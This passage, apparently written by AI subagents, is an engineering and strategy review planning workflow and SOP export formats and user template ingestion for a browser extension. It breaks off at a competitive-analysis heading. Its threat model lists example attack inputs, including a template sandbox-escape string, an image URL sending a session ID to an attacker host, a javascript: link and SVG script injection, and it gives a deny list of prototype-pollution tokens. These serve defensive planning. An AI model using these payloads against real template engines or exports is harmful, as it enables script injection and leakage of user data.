# EXPORT_TEMPLATE_REVIEW_001 — Production-Ready Exports + User Templates

**Mode 3-adjacent multi-agent strategic review · NON-counting · 2026-05-28**

**CEO directive (verbatim):** *"I do think we need to improve the export function on the SOP view and add export function to workflow view. Engage all subagents to review the best methods to provide production ready downloads of workflows and SOPs. Ultimately I would like users to be able to load their own workflow templates and SOP templates that are ingested and generated."*

**Agents engaged in parallel:** product-manager · ux-designer · system-architect · backend-engineer · frontend-engineer · qa-engineer · growth-strategist · competitive-researcher · analytics · security (via general-purpose scoping). 10 agents total. ~7,500 cumulative output words synthesized to this consolidated artifact.

**Verdict:** SCOPE-LOCK PROPOSED. 4 P0 backlog promotions; 8 P1/P2 candidates held in cold pool per MR-005 D-5 audit-intake protocol. **Zero CLAUDE.md governance diffs** — extension reliability invariant (added today) preserves stability-default posture. **Zero product code touched this iteration.** Mode 3-adjacent diagnostic does NOT increment improvement-loop cadence.

---

## §1 Executive summary

The CEO directive spans three logically separable bodies of work:

| Body | Scope | Phase |
|---|---|---|
| **A. Fix + extend export on Map + SOP views** | Restore broken "Open Full Workflow Map" button; add inline export affordances to Map view + SOP view; refactor the 5-button stack in the Export tab into a radio-list + single CTA | **MVP — 2-3 iterations** |
| **B. Production-ready multi-format downloads** | Native PDF, DOCX, Markdown, CSV, SVG-Map alongside existing HTML/JSON; deterministic generation; byte-identity invariants per format; ≥12-test floor per MR-006 Change C | **Phase 2 — 3-5 iterations** |
| **C. User-loaded templates ingested + generated against** | Upload `.docx` / `.md` templates with `{{placeholder}}` tokens; persistent storage tier; deterministic merge at export-time; template management UI; competitive moat as evidence-linked deterministic rendering | **Phase 3 — 5-8 iterations** |

**Strongest empirical findings:**

1. **Competitive moat verified** — no surveyed competitor (Scribe, Tango, Whale, Trainual, iorad, ProcessStreet, UiPath Task Capture) ships **deterministic template-fill with immutable evidence chain**. UiPath comes closest (slot-fill from capture) but uses human curation, not raw events. Scribe Optimize (Nov 2025, $1.3B valuation, $75M Series C) is the primary direct threat — they mine workflow behavior with LLM inference, but output is probabilistic, not evidence-linked. Window of opportunity: 12-18 months before Scribe could close the determinism gap via M&A on Whale or Trainual.

2. **MVP is small and safe.** The "improve SOP export + add Map export" portion is ≤2 iterations of ~120 LOC each — well under the 200 LOC pure-module threshold that would trigger system-architect adjacency per MR-005 D-4. Backend-engineer rebuilt a 4-unit decomposition; system-architect ratified.

3. **Security risk is concentrated in template ingestion (Phase 3).** 10-item threat model identified; top 3 are HIGH/HIGH severity (template-engine sandbox escape, XSS via exported HTML, PII leak bypassing policy-engine). All 12 pre-shipment security checklist items must pass before any template work ships. The export-only work in MVP/P2 carries near-zero new attack surface.

4. **Library compatibility verified against MV3 constraints.** `pdf-lib` (~180KB gzip, dynamic import) and `docx` ~180KB via `Packer.toBlob()` are MV3-safe; `mammoth` ~250KB for DOCX template ingestion is MV3-safe; `html2pdf.js` and `react-pdf` are rejected (require DOM in service worker context). All four MVP/P2 dependencies are dynamic-import-only — zero static bundle impact on sidepanel initial load (current 132KB gzip).

5. **Determinism contract extends cleanly.** Per the iter-051 invariants-test pattern, every new format has a measurable byte-identity invariant: `render(reportJson, template) → byteIdentical(output)` modulo a whitelisted variance set per format (PDF `CreationDate`, DOCX `rsid*`, etc.). The Ledgerium core promise "same input → same output" extends without modification.

6. **Plan-tier gating is the dominant industry pattern.** All surveyed competitors gate DOCX behind first paid tier; Scribe gates all exports behind $12/seat/mo Pro. Ledgerium can counter-position by offering Markdown + JSON in Free, PDF in Starter, DOCX in Team, custom templates in Growth+.

---

## §2 CEO directive interpretation

The phrase **"ingested and generated"** is interpreted as: user uploads a `.docx` or `.md` template containing `{{placeholder}}` tokens drawn from a documented vocabulary; Ledgerium performs deterministic string substitution against the workflow report JSON; output renders in the user's exact format.

Two alternative interpretations were considered and rejected for MVP scope:

- **(b) Style inference via LLM** — user uploads an exemplar SOP; Ledgerium learns its structure/voice and applies it to future generations. Rejected for MVP per AI-VISION review §11.2 sequencing (AI features queue after AI+1 provider-adapter foundation). Latency 2-8s per generation + cost without BYOK + non-determinism conflict with Ledgerium's core invariants. Phase 3+ candidate gated by AI-VISION roadmap.
- **(c) Schema validation** — user uploads a workflow definition; Ledgerium validates new recordings against it. Architecturally separate from document generation. Reserved as a Phase 4 candidate under workflow-template schema (§7.2).

The interpretation chosen for MVP is **(a) deterministic slot-fill** — the closest analog to UiPath Task Capture's mechanism, but applied to recorded workflow data rather than RPA scripts.

---

## §3 Current state survey

**Export tab** (`apps/extension-app/src/sidepanel/screens/ProcessScreen.tsx` lines 169-540, `ExportView` component):

| Button | Status | Format | Backed by |
|---|---|---|---|
| Open in Ledgerium AI Website | Working | N/A (upload + view) | `/api/sync` |
| Download Workflow Report | Working | HTML (print-to-PDF) | `workflow-report-builder.ts` → inline-styled `<style>` HTML blob |
| Open Full Workflow Map | **BROKEN** | N/A | Calls `chrome.runtime.getURL('src/viewer/index.html')` — viewer/ directory was deleted in iter 098 |
| Export Enriched JSON | Working | JSON | Steps + events + SOP merged |
| Export Raw Session JSON | Working | JSON | `SessionBundle` |

**Map view** (`SidebarProcessMap.tsx`): zero export. React Flow renders the deterministic step-graph; users have no path to extract it.

**SOP view** (`ProcessScreen.tsx SOPView`): zero export. Renders SOP read-only via `processSessionFull` engine output; users must route through Export tab.

**Workflow Report Builder** (`apps/extension-app/src/background/workflow-report-builder.ts`): pure deterministic module emitting canonical JSON `{ header, executiveSummary, metrics, workflowOverview, sop }`. Already production-quality. Determinism contract preserved: same input events → byte-identical output (modulo `generatedAt`).

**Sidepanel viewport:** ~400-500px wide. Current bundle 423KB total / 132KB gzip (Recharts + xyflow live there).

**Service worker bundle:** ~40KB. No DOM. MV3 cold-start ~50ms.

**Storage:** `chrome.storage.local` budget ≤10MB; `chrome.storage.sync` ≤100KB. API key already migrated to `.local` per iter-098 hardening.

---

## §4 Persona × format matrix

Five primary personas synthesized from PM + Growth analyses:

| Persona | Plan tier | Format demand | Specific requirement |
|---|---|---|---|
| **Process owner (ops lead)** | Starter → Team | PDF + Markdown SOP | Internal sharing, sign-off; print-clean output |
| **Training / L&D** | Starter → Team | DOCX + Markdown | Editable for LMS / wiki / Confluence paste |
| **IT / automation engineer** | Growth → Enterprise | Enriched JSON + CSV + agent-spec JSON | Pipe into n8n / Zapier / UiPath; field-bound, not prose |
| **Compliance / external auditor** | Team → Growth → Enterprise | Signed PDF + DOCX (editable for QMS) | Audit trail per output line; hash-verifiable provenance; no AI-generated content |
| **Sales engineer / pre-sales** | Growth | PDF + embed-ready HTML | Demo-ready outputs for prospect decks; evidence-linked = trust signal |

Growth-strategist verdict: **the compliance + audit persona is Ledgerium's strongest wedge.** Every other persona has commodity tooling. The "signed PDF with evidence trail" is a category-first that anchors Layer-2 enterprise buyer trust per AI-VISION §10 layered-buying-dynamic.

---

## §5 MVP / Phase 2 / Phase 3 scope split

### MVP (immediate — 2-3 iterations)

| Item | Surface | Est. LOC | Primary agent |
|---|---|---|---|
| **ETR-P01** — Fix broken `openFullView` button | `ProcessScreen.tsx ExportView` | ~5 prod, ~5 test | `frontend-engineer` |
| **ETR-P02** — Add SOP-view inline export affordance | `ProcessScreen.tsx SOPView` + `ExportView` route | ~50 prod, ~30 test | `frontend-engineer` |
| **ETR-P03** — Add Map-view inline export affordance + SVG-Map export | `SidebarProcessMap.tsx` + new `html-to-image` dynamic import | ~80 prod, ~30 test | `frontend-engineer` |
| **ETR-P04** — Markdown export (SOP + Workflow Report) | New `lib/reportRenderer/markdown.ts` + Export tab format picker | ~120 prod, ~60 test | `backend-engineer` |

**MVP excludes:** native PDF (library bundle weight + bundle-budget concern), DOCX (server-side decision pending CEO ratification), template ingestion (Phase 3), preview-before-download (UX rejected for sidepanel real estate).

**MVP acceptance criteria** (per PM §7):
1. Given a completed recording, clicking SOP-view "Download" produces a Markdown file with all SOP phases + instructions + completion criteria
2. Given the Map view, clicking "Export Map" produces an SVG file with all visible nodes/edges/labels
3. Given the Export tab, all 5 buttons function correctly (no broken handlers); the format-selection UI presents formats as a radio list with descriptions
4. `export_completed` analytics event fires on every successful export with `{ format, outputType, durationMs, stepCount }` properties
5. All export buttons are keyboard-accessible (Tab-reachable, Enter-activates) with visible focus indicators per WCAG 2.1 SC 2.1.1
6. Export actions for ≤50-step sessions complete within 500ms (no progress indicator required); >500ms requires the iter-038 `reportStatus` 3-state pattern
7. Downloaded filenames follow the pattern `{workflow-title-slug}-{YYYY-MM-DD}.{ext}` — no untitled fallbacks; path-traversal characters stripped (per QA §6)

### Phase 2 (production-quality multi-format — 3-5 iterations)

| Item | Format | Library | Bundle cost (gzip, dynamic) |
|---|---|---|---|
| **ETR-F01** — Native PDF generation | PDF | `pdf-lib` | ~180KB |
| **ETR-F02** — DOCX generation | DOCX | `docx` (`Packer.toBlob()`) OR server-side via `/api/exports/docx` | ~180KB (client) OR 0 (server) |
| **ETR-F03** — CSV steps-only export | CSV | hand-rolled emitter | 0 |
| **ETR-F04** — PNG Map snapshot (alongside SVG) | PNG | reuses `html-to-image` from ETR-P03 | 0 incremental |
| **ETR-F05** — Per-format determinism invariant tests (golden-fixture comparison) | All P2 formats | mirrors iter-051 invariants pattern | N/A |

**Phase 2 acceptance criteria** (per QA §1):
- PDF opens in Chrome 120+, Edge 120+, Adobe Acrobat 2024 with zero error dialogs; per-step text not clipped; no orphaned headings via `orphans: 2` CSS @media print
- DOCX opens in MS Word 2019+ and Word Online without repair prompts (verified via `python-docx` structural parse)
- CSV opens in Excel + Google Sheets; UTF-8 BOM for Excel
- All Phase-2 formats pass byte-identity invariant on 5+ golden fixtures
- All formats handle 12 edge cases enumerated in QA §4 (zero-step, unicode RTL/CJK/emoji, XSS in titles, sensitive-field redaction, 200+ step sessions, persistenceTruncated banner, etc.)

### Phase 3 (template ingestion + generation — 5-8 iterations)

| Item | Scope |
|---|---|
| **ETR-T01** — Template schema + Zod validators | SOP template + Workflow template schemas (§7) with versioning |
| **ETR-T02** — Template upload pipeline | Drop-zone + `<input type="file">` + `mammoth.js` parse + placeholder extraction + Zod validation |
| **ETR-T03** — Template storage tier | `chrome.storage.local` per-user; web-app DB per-org (Team+ gated); built-in defaults (4-6 starters) |
| **ETR-T04** — Template management UI | List/rename/delete (reuse iter-031 InlineEdit + InlineArchiveConfirm) + set-default toggle |
| **ETR-T05** — Template-driven SOP rendering | Logic-less merge (Mustache strict-mode subset OR hand-rolled `String.replace` over allow-list) |
| **ETR-T06** — Web Worker sandbox for template render | Off-thread `postMessage` boundary per Security §4; zero `chrome.*` access in worker |
| **ETR-T07** — Security checklist gate | All 12 pre-shipment items from Security §6 must pass before any template ship |

**Phase 3 entry blocker:** CEO must ratify Phase 2 ship-readiness and complete the security checklist gating before Phase 3 commences. Architecturally Phase 3 depends on Phase 2 formats (PDF/DOCX) being deterministic, so it cannot interleave.

---

## §6 Format priority matrix

| Format | Personas | Phase | Generation location | Library | Tier gate (proposed) |
|---|---|---|---|---|---|
| HTML report (existing) | P1 (process owner), P5 (sales engineer) | MVP (works) | Sidepanel | inline | Free |
| Raw + Enriched JSON (existing) | P3 (IT) | MVP (works) | Sidepanel | inline | Free |
| SVG Map snapshot | P1, P5 | **MVP — ETR-P03** | Sidepanel | `html-to-image` ~15KB dynamic | Free |
| Markdown SOP + Report | P2 (training), P1 | **MVP — ETR-P04** | Sidepanel | hand-rolled (~50 LOC) | Starter |
| PDF (print-to-PDF via browser) | P1, P4, P5 | MVP (zero-cost via existing HTML) | Sidepanel | inline | Starter |
| Native PDF | P4 (compliance) | **P2 — ETR-F01** | Sidepanel | `pdf-lib` ~180KB dynamic | Starter |
| DOCX | P2, P4 | **P2 — ETR-F02** | TBD per §8 | `docx` ~180KB OR server | Team |
| CSV (steps only) | P3 | **P2 — ETR-F03** | Sidepanel | hand-rolled | Starter |
| PNG Map snapshot | P1, P5 | **P2 — ETR-F04** | Sidepanel | `html-to-image` (reused) | Starter |
| Signed/hash-verified PDF bundle | P4 | P3 | Server | Phase 3 dep | Enterprise |
| Custom-template PDF | P4 | **P3 — ETR-T05** | Sandboxed | Phase 3 dep | Growth+ |
| Custom-template DOCX | P2, P4 | **P3 — ETR-T05** | Sandboxed | Phase 3 dep | Growth+ |
| Confluence direct-push | P2 | Phase 4 | Server | Confluence API | Enterprise |

**Rule established by system-architect §1:** if a format needs only string-build from the deterministic report JSON, do it sidepanel-side. If it needs binary/zip/Node-runtime libs, push to web-app. Service worker generates nothing user-facing — it stays the deterministic builder boundary.

**Backend-engineer revises this rule** per §2: `docx` library's `Packer.toBlob()` method bypasses Node `Buffer` dependency and returns a browser-native `Blob`. This permits client-side DOCX without the architect-flagged MV3 blocker. The architect and backend agents disagree on whether to take this path — this is logged as CEO open question §14 Q-D-01.

---

## §7 Template schema design (Phase 3)

### §7.1 SOP template schema (proposed)

```typescript
SopTemplate {
  templateId: string                    // crypto.randomUUID()
  templateVersion: semver               // e.g. "1.0.0"
  schemaVersion: 1
  name: string                          // user-editable; ≤80 chars
  description: string
  format: 'markdown' | 'html' | 'docx-xml'
  body: string                          // contains {{placeholder}} tokens
  placeholders: PlaceholderDef[]        // extracted at upload time
  constraints: {
    minSteps?: number
    maxSteps?: number
    requiredSystems?: string[]
  }
  createdAt: string                     // ISO
  updatedAt: string                     // ISO
  createdBy: string                     // userId
}

PlaceholderDef {
  token: string                         // e.g. 'step.action'
  scope: 'header' | 'step' | 'system' | 'metric' | 'summary'
  required: boolean
  fallback?: string
  format?: 'plain' | 'list' | 'table'
}
```

**Iteration syntax** (Mustache-subset, NO arbitrary expressions per Security §1 threat model): `{{#each steps}}{{step.action}}{{/each}}`. Logic-less by design. Turing-completeness explicitly forbidden.

### §7.2 Workflow template schema (Phase 4 deferred)

```typescript
WorkflowTemplate {
  templateId: string
  templateVersion: semver
  schemaVersion: 1
  name: string
  description: string
  expectedSystems: { name: string; required: boolean }[]
  expectedStepPatterns: { actionRegex: string; order?: number; optional: boolean }[]
  minStepCount?: number
  maxIdleGapMs?: number
  matchPolicy: 'strict' | 'lenient' | 'advisory'
}
```

Workflow template is **structural assertion**, not generation. Ingested workflows are compared against the template → emit a conformance report (separate from SOP template which IS generation). Deferred to Phase 4 per PM §4 — not in CEO's primary directive scope, but architecturally enabled.

### §7.3 Placeholder allow-list (Security §5)

Reject templates referencing anything outside:

```
{{workflow.title}}     {{workflow.createdAt}}     {{workflow.stepCount}}
{{step.index}}         {{step.label}}             {{step.durationMs}}
{{step.timestamp}}     {{step.target.role}}       {{step.target.tag}}
{{session.id}}         {{session.startedAt}}      {{session.endedAt}}
{{policy.redactedCount}}
```

**Explicitly forbidden** (PII or prototype-pollution surface): `target.label`, `target.value`, `event.raw`, `constructor`, `__proto__`, `prototype`, `*.events[*]`. Validator regex-scans template at upload; reject on first violation.

---

## §8 Architecture decisions

### §8.1 PDF approach (system-architect §2 + backend-engineer §1)

**MVP:** Print-to-PDF via existing HTML. Zero new dependency; CSS preserved at full fidelity; browser handles pagination + print. User invokes Print → Save as PDF.

**Phase 2:** Native PDF via `pdf-lib` (~180KB gzip, dynamic import only). MV3-safe (pure TS, no eval). Tables via manual x/y math (acceptable for our ≤80-column SOP layouts); bookmarks for SOP phases. **Rejected:** `jspdf` (smaller but inferior table primitive); `pdfmake` (richer but +120KB more); `html2pdf.js` (rejected — requires `html2canvas` which has no DOM in SW); `react-pdf` (rejected — renderer requires DOM/canvas).

**Phase 3+:** Server-side Puppeteer via web-app `/api/exports/pdf` route. Eliminates user-print step. Deterministic via headless Chrome render. Cost: web-app round-trip per export. Enables signed/hash-verified PDF for Enterprise tier.

### §8.2 DOCX approach (DISAGREEMENT FLAGGED FOR CEO)

| Option | Pro | Con |
|---|---|---|
| **A. Client-side** via `docx` `Packer.toBlob()` | No server round-trip; offline-capable; ~180KB dynamic import | Library bundle weight on sidepanel; one-iteration MV3 SW compatibility risk surface; Backend-engineer §2 verified safe |
| **B. Server-side** via web-app `/api/exports/docx` | Deterministic in Node canonical OOXML environment; zero bundle weight on extension; offload to Layer-2 enterprise scale | Requires web-app + network; cannot export offline; cross-cuts iter-066 Stripe stack ownership |

System-architect recommends B; backend-engineer recommends A; CEO decision required. Q-D-01 in §14.

### §8.3 Markdown approach (backend-engineer §3)

**Hand-rolled emitter — ~50 LOC, zero dependencies.** Pure string-build over the deterministic `WorkflowReport` JSON. Sidepanel-side. Trivially testable with string equality. No external library justified given we own the AST.

### §8.4 SVG-Map approach (backend-engineer §4)

**Client-side `html-to-image` dynamic import — ~15KB gzip.** Called in sidepanel React context (full DOM). Captures the rendered React Flow div. All visible nodes/edges/labels preserved. MV3-safe.

Alternative considered: manual SVG construction via `useReactFlow().toObject()` + node/edge traversal (~80 LOC, zero dependency cost). Picked `html-to-image` for MVP — implementation is 3 LOC and quality is sufficient for process maps ≤100 nodes. Manual path remains available if `html-to-image` quality issues surface.

### §8.5 Template ingestion approach (system-architect §6 + backend-engineer §5)

```
[Upload .docx/.md/.html]
   ↓
[Parse → AST]  (mammoth ~250KB for docx → HTML, remark for md, parse5 for html)
   ↓
[Placeholder extractor]  (regex-scan {{...}} tokens; build PlaceholderDef[])
   ↓
[Zod validate against SopTemplate schema]
   ↓ fail → return ValidationError with row+token location
[Dry-run render with synthetic fixture report JSON]
   ↓ fail → return RenderError (missing placeholder / infinite recursion depth-cap=5)
[Preview UI: side-by-side fixture-input → rendered-output]
   ↓ user accepts
[Persist to chosen tier]
```

Failure modes surfaced explicitly to user; no silent acceptance.

### §8.6 Storage tiers (system-architect §5)

| Tier | Location | Limit | Plan gate |
|---|---|---|---|
| **Built-ins** | bundled at `apps/extension-app/templates/builtin/*.json`; frozen at release | 4-6 starters | Free (read-only) |
| **Per-user** | `chrome.storage.local` key `templates.user.<id>` | 10MB / ~500 templates | Free (max 2) / Starter+ (unlimited) |
| **Per-org** | web-app Prisma `OrgTemplate` table keyed by `(orgId, templateId)` | server-tier | Team+ (read), Growth+ (write) |

Read precedence: org → user → built-in (first hit wins on `templateId` collision). Write path: org templates require Admin role; user templates open within plan quota.

### §8.7 Determinism invariants (system-architect §7)

1. `render(reportJson, template) → output` is pure (no `Date.now()`, no `Math.random()`, no network I/O)
2. Same `reportJson` + same `templateVersion` → byte-identical output (modulo whitelisted variance fields per format)
3. Every output embeds `{templateId, templateVersion, reportSchemaVersion, generatedAt}` as machine-readable footer/metadata
4. Template `templateVersion` is immutable once published; edits create new version
5. Placeholder resolution is total: every `{{token}}` either resolves OR emits explicit `[MISSING: token]` sentinel — never silent empty string
6. Recursion depth-capped at 5; cycle-detected via token-stack

---

## §9 Implementation iteration sizing

### §9.1 MVP unit decomposition

| Iter | Item | Prod LOC | Test LOC | Primary | Adjacency | Blockers |
|---|---|---|---|---|---|---|
| R+1 | **ETR-P01** Fix broken `openFullView` button | ~5 | ~10 | `frontend-engineer` | — | none |
| R+2 | **ETR-P02** SOP-view inline export | ~50 | ~30 | `frontend-engineer` | `growth-strategist` D-4 clause 1 (≥3 user-visible copy strings) | R+1 |
| R+3 | **ETR-P03** Map-view export + SVG generation | ~80 | ~30 | `frontend-engineer` | — | R+1; `html-to-image` dep |
| R+4 | **ETR-P04** Markdown export + format picker refactor | ~120 | ~60 | `backend-engineer` | `growth-strategist` D-4 clause 1; `system-architect` D-4 clause 2 (~200 LOC pure module) | R+1, R+2 |

Total MVP: ~255 prod LOC + ~130 test LOC across 4 iterations. All ≤200 LOC per CLAUDE.md guardrail — no system-architect adjacency forced except at R+4 boundary.

**Mode 5 decision:** MVP runs as Mode 1 series (each iteration independently reversible) NOT Mode 5 N=4 batch. Rationale: each export surface ships independently; no shared architectural-decision family that would benefit from sequence. Per WORKFLOWS_DASHBOARD_REVIEW_002 §17 Mode-1-series precedent.

### §9.2 Phase 2 unit decomposition

| Iter | Item | Prod LOC | Test LOC | Primary | Notes |
|---|---|---|---|---|---|
| R+5 | **ETR-F01** Native PDF via `pdf-lib` | ~180 | ~40 | `backend-engineer` | dynamic import |
| R+6 | **ETR-F02** DOCX via path A or B (CEO §14 Q-D-01) | ~160 | ~40 | `backend-engineer` | dynamic import (A) OR new API route (B) |
| R+7 | **ETR-F03** CSV steps export | ~40 | ~20 | `backend-engineer` | hand-rolled |
| R+8 | **ETR-F04** PNG Map snapshot | ~30 | ~15 | `frontend-engineer` | reuses ETR-P03 dep |
| R+9 | **ETR-F05** Per-format byte-identity invariant tests | 0 prod, ~200 test | — | `qa-engineer` | golden-fixture pattern |

Total P2: ~410 prod LOC + ~315 test LOC across 5 iterations.

### §9.3 Phase 3 unit decomposition

| Iter | Item | Prod LOC | Test LOC | Primary | Notes |
|---|---|---|---|---|---|
| R+10 | **ETR-T01** Template schema + Zod validators | ~120 | ~60 | `system-architect` | new contract surface > 200 LOC triggers D-4 clause 2 |
| R+11 | **ETR-T02** Template upload pipeline + mammoth | ~180 | ~50 | `backend-engineer` | mammoth ~250KB dynamic import |
| R+12 | **ETR-T03** Template storage tier (chrome.storage + Prisma model) | ~100 | ~40 | `backend-engineer` | + Prisma migration |
| R+13 | **ETR-T04** Template management UI | ~180 | ~60 | `frontend-engineer` | + ux-designer adjacency; reuses iter-031 patterns |
| R+14 | **ETR-T05** Template-driven rendering (logic-less merge) | ~150 | ~80 | `backend-engineer` | depends on T01-T03 |
| R+15 | **ETR-T06** Web Worker sandbox for render | ~80 | ~40 | `backend-engineer` | per Security §4 |
| R+16 | **ETR-T07** Security checklist gate (12 binary items) | ~50 | ~100 | `qa-engineer` + `general-purpose` (security) | hard CI gate |

Total P3: ~860 prod LOC + ~430 test LOC across 7 iterations. **MR-005 D-7 Mode-5 N≥6 pre-check MANDATORY** if any contiguous Mode-5 batch is proposed for Phase 3. Recommend Mode 1 series with mandatory meta-review interleave at iter ~13.

---

## §10 Security threat model summary (Security §1-§6)

### §10.1 Top 10 threats (ranked by severity × likelihood)

| # | Threat | Vector | Likelihood | Severity | Mitigation |
|---|---|---|---|---|---|
| 1 | Template-engine sandbox escape (`{{constructor.constructor("...")()}}` ) | Template upload | HIGH | HIGH | Logic-less Mustache-strict only; hand-rolled `String.replace` over allow-list; NO `eval`/`new Function`/`with` |
| 2 | XSS via exported HTML (`<script>`, `onerror=`) | Template author | HIGH | HIGH | DOMPurify strict profile; CSP `<meta>` injected into all HTML exports |
| 3 | PII leak bypassing policy-engine | Any export reads `target.label` directly | HIGH | HIGH | Egress gate: exports MUST consume `policyEntry.outcome === 'redact'`; runtime invariant test per format |
| 4 | DOCX XXE / zip-bomb | Crafted `.docx` upload | MED | HIGH | Reject templates >256KB; reject >50 ZIP entries; disable external entity resolution; treat OOXML as opaque blob via `fflate` |
| 5 | SSRF / tracking via remote URLs in templates | Template `<img src="https://attacker/{{sessionId}}">` | HIGH | MED | Strip all `http(s)://` URLs at upload; only `data:` URIs allowed; CSP `img-src 'self' data:` |
| 6 | Markdown `javascript:` protocol injection | `[x](javascript:alert(1))` | HIGH | MED | `marked` with `sanitizer` + post-process DOMPurify; protocol allow-list (`https`, `mailto`) |
| 7 | Storage-quota DoS | Fill `chrome.storage.local` 10MB | MED | MED | Per-template cap 64KB; total cap 50 templates; reject on quota |
| 8 | PDF JavaScript actions (`/JavaScript` action dict) | PDF generation | MED | MED | `pdf-lib` with `addJavaScript: false`; lint PDF output for `/JS`/`/JavaScript` |
| 9 | SVG export script injection (`<svg><script>`) | SVG/PNG export | MED | MED | DOMPurify `USE_PROFILES: { svg: true }`; `FORBID_TAGS: ['script', 'foreignObject']` |
| 10 | Template fingerprinting / cross-session tracking | Unique template hash identifies user | LOW | LOW | Document in privacy policy; templates local-only by default; org-tier sync explicit opt-in |

### §10.2 MV3 + Chrome Web Store policy compliance

- All PDF/DOCX/MD libs verified zero `eval` / `new Function` — passes CWS policy
- No new permissions required (no `downloads` permission needed; use `URL.createObjectURL` + `<a download>` pattern)
- Template ingestion uses existing `chrome.storage.local` — no new permission
- File picker via `<input type="file">` — no new permission
- CSP enforcement: MV3 default `script-src 'self'` blocks inline scripts; template rendering MUST output strings → DOMPurify → DOM-serialize (never `innerHTML` of user template content)

### §10.3 Sandboxing verdict (Security §4)

**Off-thread Web Worker via `postMessage` boundary.** Worker receives `{template, allowlistedData}`, returns rendered string. Worker has **zero `chrome.*` access** by design. Eliminates threat #1 (sandbox escape) — even if logic-less engine has a parser bug, escape lands in a worker with zero extension API access. Rejected alternatives: iframe (MV3 sandbox-iframe CSP restrictive + adds permission complexity); in-React (shares origin with extension).

### §10.4 Pre-shipment security checklist (12 binary items)

Must all pass before any template-related code ships to production:

1. ☐ All PDF/DOCX/MD libs audited for `eval`/`new Function` — zero hits
2. ☐ Templates >64KB rejected at upload
3. ☐ Total template count ≤50 enforced
4. ☐ DOMPurify integrated on HTML + SVG export paths
5. ☐ PDF export verified free of `/JavaScript` action dictionaries
6. ☐ DOCX export uses zero external relationships (`r:id` only to embedded parts)
7. ☐ Placeholder allow-list validator rejects `target.label`, `__proto__`, `constructor`
8. ☐ Template rendering runs in Web Worker; worker has zero `chrome.*` permissions
9. ☐ No new manifest permissions added (verified by manifest diff)
10. ☐ Policy-engine `redact` outcome honored in every export path (unit test per format)
11. ☐ CSP `<meta>` injected in HTML exports: `default-src 'none'; img-src 'self' data:`
12. ☐ Markdown protocol allow-list (`https`, `mailto` only) verified via fuzz corpus

---

## §11 Analytics + measurement plan (Analytics §1-§6)

### §11.1 New event taxonomy (10 events)

| Event | Properties | Business question |
|---|---|---|
| `export_panel_opened` | `{ workflowId, source }` | What fraction of recordings result in an export attempt? |
| `export_format_selected` | `{ workflowId, format, outputType }` | Which format × outputType pairing dominates? |
| `export_completed` | `{ workflowId, format, outputType, durationMs, stepCount, templateApplied }` | Completion rate; does template use correlate? |
| `export_failed` | `{ workflowId, format, errorCode }` | Where does generation fail? |
| `template_picker_opened` | `{ context }` | Is template discoverability a problem? |
| `template_upload_initiated` | `{ fileExtension, fileSizeKb }` | What file types do users attempt? |
| `template_parse_completed` | `{ fileExtension, parsedSectionCount, success }` | Parse success rate by type? |
| `template_saved` | `{ templateId, sectionCount }` | How many templates does the average user maintain? |
| `template_selected_for_export` | `{ templateId, workflowId, format }` | Which saved templates get reused? |
| `template_generation_completed` | `{ templateId, workflowId, format, durationMs }` | Does template-driven export take longer? |

All inherit `userPlan` via the iter-038 MDR-P09 side-channel.

### §11.2 Funnels (3)

| Funnel | Steps | Target |
|---|---|---|
| Export-from-recording | `workflow_uploaded` → `export_panel_opened` → `export_format_selected` → `export_completed` | ≥40% in 7-day window |
| Template upload | `template_picker_opened` → `template_upload_initiated` → `template_parse_completed` (success:true) → `template_saved` | ≥70% from upload to save |
| Template-driven generation | `export_panel_opened` → `template_selected_for_export` → `template_generation_completed` | ≥80% completion |

### §11.3 Launch gates (5 per Analytics §3)

| Gate | Signal | Floor | Ceiling | Window |
|---|---|---|---|---|
| G-1 Export completion rate | `export_completed` / `export_panel_opened` | 60% | — | 14d |
| G-2 Template parse success | `template_parse_completed(success:true)` / `template_upload_initiated` | 70% | — | 14d |
| G-3 Export error rate | `export_failed` / (`export_completed` + `export_failed`) | — | 10% | 7d |
| G-4 Template reuse rate | unique reused-templateId / total saved | 30% | — | 30d |
| G-5 Format breadth | distinct `format` in `export_completed` | ≥3 | — | 14d |

### §11.4 PII / privacy allow-list (Analytics §4)

**Cannot track:** template file names; template body content; workflow step labels; captured input values; template section headings; file paths; user-defined template names.

**Can track:** `fileExtension` (type only); `fileSizeKb` (rounded to 10); `parsedSectionCount` (structural count); `stepCount`; `format` enum; `outputType` enum; `durationMs`; `templateId` (opaque UUID); `errorCode` (system).

### §11.5 Pre-launch baselines (Analytics §6)

5 baselines to establish before MVP ships — without baseline, post-launch improvement claim is unverifiable:

1. Current `workflow_exported` rate (existing taxonomy) / `workflow_viewed` rate per `workflowId`, 30-day window
2. `tab_switched { tab: 'report' }` vs `workflow_exported { format: * }` ratio — reveals current report-view-but-no-download gap
3. Free-tier export attempt rate baseline (per-plan-tier filter)
4. `first_export` rate among 30-day cohort post `first_workflow_uploaded`
5. SOP usefulness baseline rate (`sop_usefulness_response { response: 'yes_as_is' }`) — improvement target post template launch

---

## §12 Competitive context + moat positioning (Competitive §1-§9)

### §12.1 Competitor export-format matrix (excerpt)

| Tool | PDF | DOCX | HTML | MD | Templates | Direct Confluence push | LLM SOP-gen |
|---|---|---|---|---|---|---|---|
| **Scribe** | Pro+ | Pro+ | Pro+ | Pro+ | No (only staff-built page templates) | YES (native) | YES (AI writer; Scribe Optimize $75M Series C 11/2025) |
| **Tango** | Pro+ | No (copy-paste) | Embed | No | No | Embed only | No |
| **Whale** | Yes | Yes | No | No | YES (Word/PDF/PPT + AI parse) | Positions as Confluence alternative | YES (free SOP gen from description) |
| **Trainual** | Yes | No | No | No | YES (doc import beta) | No | Yes (AI drafting in editor) |
| **iorad** | Yes | Pro+ | Enterprise | No | No | Embed | No |
| **ProcessStreet** | Print-to-PDF | No | No | No | No | No | No |
| **UiPath Task Capture** | Word→PDF | YES (custom `.ssword` templates with `{placeholders}`) | No | No | YES (best-in-class slot-fill) | No | No |
| **Bardeen** | No | No | No | No | N/A | N/A | N/A |

### §12.2 Template ingestion — competitive ranking

1. **UiPath Task Capture** — Most capable. `.docx` / `.ssword` templates with `{placeholder}` tokens; full structural control. Closest mechanism to Ledgerium's proposed design.
2. **Whale** — AI re-structures uploaded Word/PDF/PPT; not slot-fill, LLM-driven.
3. **Trainual** — Document import (beta); imports as content, not template-fill.
4. **Scribe** — Explicitly does NOT support importing external docs (confirmed via their FAQ).
5-10. Others — no template ingestion of any kind.

### §12.3 PDF-fidelity bar (Competitive §4)

